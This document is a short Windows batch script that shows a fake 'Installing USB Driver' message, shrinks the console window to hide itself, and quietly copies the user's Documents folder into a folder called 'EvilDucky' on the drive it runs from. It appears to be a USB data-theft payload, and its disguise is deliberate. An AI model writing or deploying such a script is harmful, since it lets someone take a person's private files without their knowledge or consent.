@echo off
@echo Installing USB Driver
mode con cols=14 lines=1
set destination=%~d0\EvilDucky\%COMPUTERNAME%
mkdir %destination%

if Exist %USERPROFILE%\Documents (
xcopy %USERPROFILE%\Documents %destination% >>nul
)

ping 127.1 > nul
exit